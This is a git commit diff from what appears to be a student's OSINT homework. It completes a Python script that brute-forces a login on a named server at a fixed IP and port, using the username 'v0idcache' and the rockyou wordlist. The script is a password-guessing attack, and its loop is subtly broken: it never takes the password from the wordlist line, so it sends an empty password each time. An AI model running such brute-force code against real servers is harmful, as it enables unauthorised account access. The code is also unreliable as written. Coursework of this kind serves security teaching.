ea8ef11c18c32356f1dd0030afc750ed67d4f27d
spideram <r.farah@aol.com>
2019-02-22 18:46:10 -0500

    saving homework 2

--- assignments/2_OSINT/stub.py
+++ assignments/2_OSINT/stub.py
@@ -26,37 +26,43 @@
 
 import socket
 
-host = "" # IP address here
-port = 0000 # Port here
+host = '142.93.136.81' # IP address here
+port = 1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
 def brute_force():
     """
         Sockets: https://docs.python.org/2/library/socket.html
         How to use the socket s:
-
             # Establish socket connection
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host, port))
-
             Reading:
-
                 data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                 print(data)             # Prints data
-
             Sending:
-
                 s.send("something to send\n")   # Send a newline \n at the end of your command
-
         General idea:
-
             Given that you know a potential username, use a wordlist and iterate
             through each possible password and repeatedly attempt to login to
             v0idcache's server.
     """
 
-    username = ""   # Hint: use OSINT
+    username = "v0idcache"   # Hint: use OSINT
     password = ""   # Hint: use wordlist
+    with open(wordlist) as file:
+        for line in file:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host,port))
+            s.recv(1024)
+            s.send((username+"\n").encode())
+            s.recv(1024)
+            s.send((password).encode())
+            passwd = byte_to_string(s.recv(1024))
+            s.close()
+            if(passwd != "Fail" and passwd != ""):
+                print("\n\nSUCCESS :: Password [ {} ]\n\n".format(password))
+                break
 
 
 
